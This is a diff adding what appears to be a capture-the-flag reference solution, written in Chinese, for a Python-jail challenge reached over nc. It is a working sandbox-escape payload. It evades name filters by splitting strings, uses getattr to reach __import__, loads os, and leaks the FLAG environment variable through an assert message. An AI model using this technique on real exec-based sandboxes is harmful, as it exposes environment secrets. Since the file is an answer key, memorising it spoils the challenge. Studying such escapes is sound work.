@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 exec 执行）：
+
+# __dict__ 被封 -> getattr 替代；所有敏感名拆拼接
+O = getattr(globals()['__bu'+'iltins__'], '__i'+'mport__')('o'+'s')
+assert 0, getattr(O, 'envi'+'ron')['F'+'LAG']
